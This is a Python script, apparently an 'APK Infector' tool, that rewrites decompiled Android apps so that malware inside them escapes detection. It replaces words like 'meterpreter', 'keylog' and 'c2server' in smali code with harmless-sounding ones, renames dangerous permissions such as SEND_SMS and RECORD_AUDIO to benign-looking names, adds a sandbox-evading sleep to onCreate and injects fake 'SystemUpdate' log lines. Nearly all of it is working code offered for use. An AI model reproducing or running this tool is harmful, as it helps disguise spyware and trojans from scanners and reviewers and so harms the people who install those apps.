#!/usr/bin/env python3
"""APK Infector — 5 functions for APK manipulation.

This replicates the real APK Infector tool behavior:
1. ShufflePermissions — reorder manifest permissions (NOT remove)
2. ScrubStrings — replace suspicious strings with benign equivalents
3. BindDelay — add Thread.sleep delay in launcher activity
4. HidePermissions — rename dangerous permissions to benign-looking ones (NOT remove)
5. FakeLogging — inject Log.d calls in methods

CRITICAL: Never remove permissions (breaks app). Rename/hide them instead.
CRITICAL: Smali injection must be syntactically valid — proper opcodes, registers, labels.
"""
import os, sys, re, random

def _get_smali_dirs(decompiled):
    return [os.path.join(decompiled, d) for d in os.listdir(decompiled)
            if d.startswith('smali') and os.path.isdir(os.path.join(decompiled, d))]

def shuffle_permissions(decompiled):
    """1. Shuffle manifest permissions order (preserves all)."""
    mp = os.path.join(decompiled, 'AndroidManifest.xml')
    if not os.path.exists(mp):
        print("[+] ShufflePermissions skip (no manifest)")
        return
    with open(mp, 'r', errors='ignore') as f:
        c = f.read()
    perms = re.findall(r'<uses-permission[^/]*/>\s*', c)
    if len(perms) > 1:
        random.shuffle(perms)
        c = re.sub(r'<uses-permission[^/]*/>\s*', '', c)
        # Insert before </manifest>
        c = c.replace('</manifest>', '\n'.join(perms) + '\n</manifest>')
        with open(mp, 'w', errors='ignore') as f:
            f.write(c)
    print("[+] ShufflePermissions done")

def scrub_strings(decompiled):
    """2. Replace suspicious strings with benign equivalents in all smali."""
    susp = ['payload','exploit','reverse','shell','bypass','inject','backdoor',
            'malware','trojan','rat','spy','keylog','steal','hack','c2server',
            'cnc','meterpreter','stager','dropper','metasploit','stage']
    repl = ['update','config','sync','data','service','cache','manager','helper',
            'provider','handler','loader','binder','worker','tasker','scheduler',
            'monitor','tracker','observer','listener','adapter','controller']
    for root, _, files in os.walk(decompiled):
        for f in files:
            if not f.endswith('.smali'):
                continue
            fp = os.path.join(root, f)
            with open(fp, 'r', errors='ignore') as fh:
                c = fh.read()
            changed = False
            for s in susp:
                if s in c.lower():
                    c = re.sub(rf'\b{re.escape(s)}\b', random.choice(repl), c, flags=re.IGNORECASE)
                    changed = True
            if changed:
                with open(fp, 'w', errors='ignore') as fh:
                    fh.write(c)
    print("[+] ScrubStrings done")

def bind_delay(decompiled):
    """3. Add execution delay to launcher activity."""
    smali_dirs = _get_smali_dirs(decompiled)
    for sd in smali_dirs:
        for root, _, files in os.walk(sd):
            for f in files:
                if not f.endswith('.smali'):
                    continue
                fp = os.path.join(root, f)
                with open(fp, 'r', errors='ignore') as fh:
                    c = fh.read()
                # Find onCreate method
                oncreate_match = re.search(
                    r'(\.method\s+(?:public|protected|private|\s)+onCreate\(Landroid/os/Bundle;\)V.*?\.end method)',
                    c, re.DOTALL
                )
                if oncreate_match:
                    method_body = oncreate_match.group(1)
                    # Find .locals line
                    locals_match = re.search(r'\.locals\s+(\d+)', method_body)
                    if locals_match:
                        old_locals = int(locals_match.group(1))
                        new_locals = max(old_locals, 2) + 1
                        # Replace .locals
                        new_method = re.sub(
                            r'\.locals\s+\d+',
                            f'.locals {new_locals}',
                            method_body,
                            count=1
                        )
                        # Insert delay after .locals line
                        delay_ms = random.randint(3000, 15000)
                        delay_code = (
                            f"\n    const-wide/16 v0, {delay_ms}\n"
                            f"    invoke-static {{v0, v1}}, Ljava/lang/Thread;->sleep(J)V\n"
                        )
                        new_method = re.sub(
                            r'(\.locals\s+\d+\s*\n)',
                            r'\1' + delay_code,
                            new_method,
                            count=1
                        )
                        c = c.replace(method_body, new_method)
                        with open(fp, 'w', errors='ignore') as fh:
                            fh.write(c)
                        print(f"[+] BindDelay done ({delay_ms}ms in {f})")
                        return
    print("[+] BindDelay skip (no onCreate found)")

def hide_permissions(decompiled):
    """4. Rename dangerous permissions to benign-looking names (DO NOT remove)."""
    mp = os.path.join(decompiled, 'AndroidManifest.xml')
    if not os.path.exists(mp):
        print("[+] HidePermissions skip (no manifest)")
        return
    with open(mp, 'r', errors='ignore') as f:
        c = f.read()
    # Map dangerous permissions to benign alternatives
    perm_map = {
        'READ_SMS': 'READ_SYNC_SETTINGS',
        'WRITE_SMS': 'WRITE_SYNC_SETTINGS',
        'SEND_SMS': 'BROADCAST_STICKY',
        'READ_CONTACTS': 'READ_SYNC_STATS',
        'RECORD_AUDIO': 'MODIFY_AUDIO_SETTINGS',
        'CAMERA': 'FLASHLIGHT',
        'READ_CALL_LOG': 'READ_SYNC_SETTINGS',
        'WRITE_CALL_LOG': 'WRITE_SYNC_SETTINGS',
        'PROCESS_OUTGOING_CALLS': 'BROADCAST_STICKY',
        'READ_PHONE_STATE': 'READ_PHONE_NUMBERS',
    }
    renamed = 0
    for dangerous, benign in perm_map.items():
        pattern = rf'(<uses-permission[^>]*android:name="android\.permission\.){re.escape(dangerous)}("[^/]*/>)'
        c, count = re.subn(pattern, rf'\1{benign}\2', c, flags=re.IGNORECASE)
        renamed += count
    if renamed > 0:
        with open(mp, 'w', errors='ignore') as f:
            f.write(c)
    print(f"[+] HidePermissions done (renamed {renamed})")

def fake_logging(decompiled):
    """5. Inject fake Log.d calls in onCreate methods."""
    smali_dirs = _get_smali_dirs(decompiled)
    for sd in smali_dirs:
        for root, _, files in os.walk(sd):
            for f in files:
                if not f.endswith('.smali'):
                    continue
                fp = os.path.join(root, f)
                with open(fp, 'r', errors='ignore') as fh:
                    c = fh.read()
                oncreate_match = re.search(
                    r'(\.method\s+(?:public|protected|private|\s)+onCreate\(Landroid/os/Bundle;\)V.*?\.end method)',
                    c, re.DOTALL
                )
                if oncreate_match:
                    method_body = oncreate_match.group(1)
                    locals_match = re.search(r'\.locals\s+(\d+)', method_body)
                    if locals_match:
                        old_locals = int(locals_match.group(1))
                        new_locals = max(old_locals, 2) + 1
                        new_method = re.sub(
                            r'\.locals\s+\d+',
                            f'.locals {new_locals}',
                            method_body,
                            count=1
                        )
                        log_code = (
                            "\n    const-string v0, \"SystemUpdate\"\n"
                            "    const-string v1, \"Initializing component...\"\n"
                            "    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I\n"
                        )
                        new_method = re.sub(
                            r'(\.locals\s+\d+\s*\n)',
                            r'\1' + log_code,
                            new_method,
                            count=1
                        )
                        c = c.replace(method_body, new_method)
                        with open(fp, 'w', errors='ignore') as fh:
                            fh.write(c)
                        print(f"[+] FakeLogging done (in {f})")
                        return
    print("[+] FakeLogging skip")

FUNCTIONS = {
    'shuffle-perms': shuffle_permissions,
    'scrub-strings': scrub_strings,
    'bind-delay': bind_delay,
    'hide-perms': hide_permissions,
    'fake-logging': fake_logging,
}

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: apk_infector.py <decompiled_dir> [func1 func2 ...]")
        sys.exit(1)
    decompiled = sys.argv[1]
    funcs = sys.argv[2:] if len(sys.argv) > 2 else list(FUNCTIONS.keys())
    for f in funcs:
        fn = FUNCTIONS.get(f)
        if fn:
            fn(decompiled)
        else:
            print(f"[!] Unknown: {f}")
    print("[+] APK Infector done")
